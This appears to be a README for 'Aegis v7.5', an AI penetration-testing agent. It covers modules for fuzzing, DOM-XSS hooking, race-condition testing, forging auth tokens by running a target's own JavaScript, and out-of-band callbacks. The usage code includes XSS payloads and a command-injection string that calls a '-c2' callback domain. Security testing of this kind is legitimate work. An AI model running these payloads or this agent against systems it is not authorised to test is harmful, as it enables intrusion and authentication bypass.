# Aegis v7.5 "Architect" - Zero-Day Research Capabilities

## Overview

Aegis v7.5 transforms the agent from a "Tool Orchestrator" into a "Zero-Day Researcher" by replacing reliance on pre-made tools with **generative capabilities**. The following six modules enable raw protocol synthesis, neuro-symbolic reasoning, and state-aware memory.

---

## 1. Genesis Protocol Fuzzer 🧬

**Location:** `tools/genesis_fuzzer.py`

### Purpose
Instead of running signature-based tools like Nuclei, Genesis generates thousands of edge-case mutations based on protocol grammar to discover **zero-day vulnerabilities**.

### Key Features
- **Grammar-Based Fuzzing:** LLM defines protocol structure, Genesis breaks it
- **7 Mutation Strategies:**
  - Bit flips for binary protocols
  - Integer overflow/underflow (32-bit, 64-bit boundaries)
  - Format string injection (`%s`, `%n`, `%x`)
  - Boundary violations (buffer overflows)
  - Unicode and encoding edge cases
  - Null byte injection
  - Command injection patterns
  - SQL injection
  - XSS payloads
- **Concurrent Execution:** Up to 50 parallel requests
- **Anomaly Detection:** Automatically identifies deviations in responses

### Usage Example

```python
from tools.genesis_fuzzer import get_genesis_fuzzer

# Initialize fuzzer
fuzzer = get_genesis_fuzzer()

# Define protocol grammar
grammar = {
    "username": {"type": "string", "max_len": 20},
    "age": {"type": "integer", "min": 0, "max": 120},
    "email": {"type": "email"}
}

# Compile grammar
fuzzer.compile_grammar(grammar)

# Generate mutations
base_payload = {"username": "admin", "age": 25, "email": "user@example.com"}
mutations = fuzzer.generate_mutations(base_payload)
print(f"Generated {len(mutations)} mutations")

# Fuzz an endpoint
import asyncio

async def test_endpoint():
    result = await fuzzer.fuzz_endpoint(
        url="https://api.example.com/register",
        method="POST",
        grammar=grammar,
        base_payload=base_payload,
        headers={"Content-Type": "application/json"}
    )
    
    print(f"Total mutations: {result['total_mutations']}")
    print(f"Anomalies found: {len(result['anomalies'])}")
    
    for anomaly in result['anomalies'][:5]:
        print(f"\nSeverity {anomaly['severity']}: {anomaly['reasons']}")

asyncio.run(test_endpoint())
```

### Why It Works
Genesis finds bugs with **no CVE ID** because it tests the logic of the specific application, not just signatures.

---

## 2. Cortex Graph Memory 🧠

**Location:** `agents/enhanced_ai_core.py` (CortexMemory class)

### Purpose
Fixes "state amnesia" by implementing a knowledge graph where every URL/State is a "Node" and every action is an "Edge". Enables algorithmic backtracking.

### Key Features
- **State Tracking:** Every action creates a node with URL, artifacts, DOM hash
- **Path Memory:** Complete exploitation path stored as graph edges
- **Three Backtracking Strategies:**
  - `untested`: Find nodes with unexplored outgoing edges
  - `successful`: Find nodes from high-weight (successful) actions
  - `nearest`: Go back N steps in the current path
- **Persistence:** Saved as GraphML for session recovery
- **Path Visualization:** Human-readable path display

### Usage Example

```python
from agents.enhanced_ai_core import CortexMemory

# Initialize Cortex
cortex = CortexMemory(mission_id="pentest_2024")

# Record actions during exploitation
cortex.record_action(
    action="Navigate to login page",
    result={"success_score": 1.0, "status_code": 200},
    new_url="https://example.com/login",
    artifacts={"forms": ["login_form"]},
    dom_hash="abc123"
)

cortex.record_action(
    action="Submit admin credentials",
    result={"success_score": 0.8, "status_code": 302},
    new_url="https://example.com/dashboard",
    artifacts={"authenticated": True}
)

cortex.record_action(
    action="Attempt admin panel access",
    result={"success_score": 0.0, "status_code": 403},
    new_url="https://example.com/admin",
    artifacts={"error": "Access Denied"}
)

# Stuck? Backtrack!
backtrack_node = cortex.find_backtrack_path(heuristic="successful")
if backtrack_node:
    cortex.set_current_node(backtrack_node)
    print(f"Backtracked to: {backtrack_node}")

# Visualize path
print(cortex.visualize_path())

# Get current state
state = cortex.get_current_state()
print(f"At node {state['node_id']}: {state['url']}")
print(f"Graph has {state['total_nodes']} nodes, {state['total_edges']} edges")
```

### Why It Works
Instead of losing context, Cortex remembers: "I am stuck at Admin Panel, let me go back 3 steps to Registration and try a different username."

---

## 3. Deep Dive CDP Interceptor 🔍

**Location:** `tools/cdp_hooks.py`

### Purpose
Uses Chrome DevTools Protocol (CDP) to hook JavaScript sinks and detect **DOM-based XSS** that traditional scanners miss.

### Key Features
- **JavaScript Hooks:** Intercepts `eval()`, `setTimeout()`, `innerHTML`, `outerHTML`, `document.write`
- **Mutation Observer:** Monitors dangerous attribute changes (`onclick`, `href`, `src`)
- **Console Trap Monitoring:** Captures `[AEGIS_TRAP]` events in real-time
- **Automated Testing:** Injects XSS payloads and correlates with traps
- **Playwright Integration:** Works with modern SPAs

### Usage Example

```python
from tools.cdp_hooks import get_cdp_hooks
import asyncio

async def test_dom_xss():
    cdp = get_cdp_hooks()
    await cdp.initialize(headless=True)
    
    # Test for DOM XSS
    result = await cdp.test_dom_xss(
        url="https://example.com/search?q=test",
        test_payloads=[
            "<img src=x onerror=alert('XSS')>",
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')"
        ]
    )
    
    print(f"Vulnerable: {result['vulnerable']}")
    print(f"Trapped events: {result['total_traps']}")
    print(f"Confirmed vulnerabilities: {result['vulnerability_count']}")
    
    for vuln in result['confirmed_vulnerabilities']:
        print(f"\n[!] {vuln['severity']}: {vuln['payload']}")
    
    await cdp.close()

asyncio.run(test_dom_xss())
```

### Injected Hook Example

The CDP interceptor injects this JavaScript into every page:

```javascript
window.eval = function(code) {
    console.log('[AEGIS_TRAP]', JSON.stringify({
        type: 'AEGIS_TRAP',
        sink: 'eval',
        payload: code,
        timestamp: Date.now()
    }));
    return originalEval(code);
};
```

### Why It Works
Sees the **invisible code** that gets executed, detecting XSS sources hidden in DOM manipulation.

---

## 4. Chronos Concurrency Engine ⏱️

**Location:** `tools/race_engine.py`

### Purpose
Detects race conditions and TOCTOU (Time-of-Check-Time-of-Use) bugs by synchronizing multiple requests to hit the server **simultaneously**.

### Key Features
- **Synchronization Barrier:** All threads wait at a barrier, then release together
- **Concurrent Execution:** 30-50 simultaneous requests
- **Anomaly Detection:**
  - Different status codes (some succeed, some fail)
  - Content length variance
  - Response time deviations (blind injection indicator)
  - Duplicate IDs (counter race)
- **Counter Race Testing:** Specialized detection for sequential ID races

### Usage Example

```python
from tools.race_engine import get_chronos_engine
import asyncio

async def test_race_condition():
    engine = get_chronos_engine()
    
    # Test a vulnerable endpoint
    result = await engine.execute_race(
        url="https://example.com/api/redeem-coupon",
        method="POST",
        data={"coupon_code": "SAVE50"},
        threads=50,
        headers={"Content-Type": "application/json"}
    )
    
    print(f"Total requests: {result['total_requests']}")
    print(f"Anomaly detected: {result['analysis']['has_anomaly']}")
    print(f"Confidence: {result['analysis']['confidence']}%")
    
    for finding in result['analysis']['findings']:
        print(f"\n[{finding['severity']}] {finding['description']}")
        print(f"  Indicator: {finding['indicator']}")

# Test counter race conditions
async def test_counter_race():
    engine = get_chronos_engine()
    
    result = await engine.test_counter_race(
        url="https://example.com/api/create-order",
        data={"product_id": 123, "quantity": 1},
        threads=50
    )
    
    if 'duplicate_ids' in [f['type'] for f in result['analysis']['findings']]:
        print("[CRITICAL] Counter race condition confirmed!")
        print(f"Duplicate IDs detected: {result['analysis']['findings']}")

asyncio.run(test_race_condition())
```

### Why It Works
Manipulates **time** (concurrency) to trigger race windows that sequential requests would miss.

---

## 5. Mirror JS Sandbox 🪞

**Location:** `tools/python_tools.py` (execute_extracted_js method)

### Purpose
Executes JavaScript extracted from the target's source code to generate valid tokens, bypassing client-side validation.

### Key Features
- **Node.js Sandbox:** Secure subprocess execution with 5s timeout
- **Function Extraction:** Automatically extracts functions from web pages
- **Token Generation:** Calls cryptographic functions to create valid auth tokens
- **Error Handling:** JSON-based result parsing with fallback

### Usage Example

```python
from tools.python_tools import PythonToolManager
import asyncio

tool = PythonToolManager()

# Example 1: Execute extracted function directly
js_code = """
function generateAuthToken(username, timestamp) {
    const secret = 'hardcoded_secret';
    return btoa(username + ':' + timestamp + ':' + secret);
}
"""

result = tool.execute_extracted_js(
    js_code=js_code,
    arguments=["admin", "1640000000"],
    function_name="generateAuthToken"
)

print(f"Generated token: {result}")

# Example 2: Extract and execute from live site
async def extract_and_run():
    result = await tool.extract_and_execute_js_function(
        target_url="https://example.com/app.js",
        function_pattern=r'function generateToken\(.*?\{[^}]+\}',
        arguments=["admin", "1640000000"]
    )
    print(f"Token from extracted function: {result}")

asyncio.run(extract_and_run())
```

### Why It Works
Uses the **target's own code** against it, instead of trying to replicate complex logic in Python.

---

## 6. Echo OOB Correlator 📡

**Location:** `listeners/dns_callback.py`

### Purpose
Detects **delayed/blind vulnerabilities** through out-of-band channels (DNS, HTTP callbacks) that may trigger hours or days after injection.

### Key Features
- **UUID-Based Tracking:** Every payload gets a unique ID
- **SQLite Persistence:** Correlates callbacks with original injections
- **Multiple Protocols:** DNS, HTTP, SMTP callbacks
- **Delayed Detection:** Works for vulnerabilities that trigger hours/days later
- **Auto-Classification:** P0 severity for confirmed OOB vulnerabilities

### Usage Example

```python
from listeners.dns_callback import get_oob_manager

# Initialize OOB manager
oob = get_oob_manager(callback_domain="aegis-c2.yourdomain.com")

# Create DNS callback payload for RCE testing
payload = oob.create_dns_payload(
    target_url="https://example.com/api/search",
    payload_type="RCE",
    target_parameter="q"
)

print(f"Payload ID: {payload['payload_id']}")
print(f"Instrumented payload: {payload['instrumented_payload']}")
# Output: '; nslookup id-a1b2c3.aegis-c2.yourdomain.com; #

# Create HTTP callback payload for XSS
xss_payload = oob.create_http_payload(
    target_url="https://example.com/comment",
    payload_type="XSS",
    target_parameter="message"
)

print(f"XSS payload: {xss_payload['instrumented_payload']}")
# Output: <img src='http://id-d4e5f6.aegis-c2.yourdomain.com/xss.gif'>

# Later, when DNS server receives query for id-a1b2c3...
correlation = oob.register_callback(
    payload_id="a1b2c3",
    callback_type="DNS",
    callback_data={"query": "id-a1b2c3.aegis-c2.yourdomain.com"},
    source_ip="192.168.1.100"
)

print(f"\n[CRITICAL] Vulnerability confirmed!")
print(f"Type: {correlation['payload_type']}")
print(f"Target: {correlation['target_url']}")
print(f"Delay: {correlation['delay_hours']:.2f} hours")
print(f"Severity: {correlation['severity']}")

# Check pending payloads
pending = oob.get_pending_payloads(max_age_hours=72)
print(f"\nPending payloads: {len(pending)}")

# Get confirmed vulnerabilities
confirmed = oob.get_confirmed_vulnerabilities(limit=10)
for vuln in confirmed:
    print(f"\n[{vuln['severity']}] {vuln['payload_type']}")
    print(f"  URL: {vuln['target_url']}")
    print(f"  Confirmed: {vuln['confirmed_at']}")
    print(f"  Delay: {vuln['delay_hours']:.2f} hours")

# Get statistics
stats = oob.get_statistics()
print(f"\nTotal payloads: {stats['total_payloads']}")
print(f"Confirmed vulnerabilities: {stats['confirmed_vulnerabilities']}")
print(f"Payloads by type: {stats['payloads_by_type']}")
```

### Production Deployment

For production use, you need:

1. **DNS Server:** Configure a real DNS server to receive queries
2. **Domain:** Own a domain for callbacks (e.g., `aegis-c2.com`)
3. **Listener:** Background process to monitor DNS/HTTP:

```python
import asyncio
from listeners.dns_callback import get_oob_manager

async def run_listener():
    oob = get_oob_manager(callback_domain="aegis-c2.com")
    
    # In production, implement real DNS/HTTP listener
    await oob.start_listener(port=53, protocol="DNS")
    
    # Keep running
    while True:
        await asyncio.sleep(60)

asyncio.run(run_listener())
```

### Why It Works
Finds **blind vulnerabilities** that have no immediate feedback, by creating a persistent "listener state" that correlates unique IDs.

---

## Integration with Aegis Core

All six modules can be used independently or integrated with the main Aegis AI agent:

```python
from agents.enhanced_ai_core import EnhancedAegisAI, CortexMemory
from tools.genesis_fuzzer import get_genesis_fuzzer
from tools.cdp_hooks import get_cdp_hooks
from tools.race_engine import get_chronos_engine
from listeners.dns_callback import get_oob_manager

# Initialize all modules
cortex = CortexMemory(mission_id="pentest_2024")
genesis = get_genesis_fuzzer()
cdp = get_cdp_hooks()
chronos = get_chronos_engine()
oob = get_oob_manager()

# Use in agent workflow
ai = EnhancedAegisAI(
    target="https://example.com",
    mission_blackboard=cortex
)

# Agent can now:
# 1. Use Genesis to fuzz APIs
# 2. Use Cortex to navigate and backtrack
# 3. Use CDP to detect DOM XSS
# 4. Use Chronos to test race conditions
# 5. Use OOB to track blind vulnerabilities
```

---

## Summary

By implementing these six modules, Aegis v7.5 **stops "guessing" and starts "proving":**

| Module | Fixes | Capability |
|--------|-------|------------|
| Genesis | Orchestrator Bottleneck | Generates attack surface |
| Cortex | State Amnesia | Maps logic flow |
| Deep Dive | Shallow Visuals | Sees invisible code |
| Chronos | Sequential Testing | Manipulates time |
| Mirror | Auth Bypass | Uses target's code |
| Echo | Missed Blind Vulns | Listens for delayed failures |

---

## Testing

Run the comprehensive test suite:

```bash
python test_v7_5_features.py
```

Expected output:
```
======================================================================
TEST SUMMARY
======================================================================
  Genesis Fuzzer: ✅ PASSED
  Cortex Memory: ✅ PASSED
  Mirror Sandbox: ✅ PASSED
  Echo OOB: ✅ PASSED
  CDP Hooks: ✅ PASSED
  Chronos Engine: ✅ PASSED

Total: 6/6 tests passed

🎉 ALL TESTS PASSED! Aegis v7.5 'Architect' is ready.
```

---

## Requirements

```bash
pip install networkx aiohttp json-repair playwright selenium webdriver-manager python-nmap
```

For Mirror JS Sandbox, you also need:
```bash
# Install Node.js (required for JavaScript execution)
# Ubuntu/Debian:
sudo apt-get install nodejs

# macOS:
brew install node

# Windows:
# Download from https://nodejs.org
```

---

## License

Part of the Aegis AI Security Agent project.
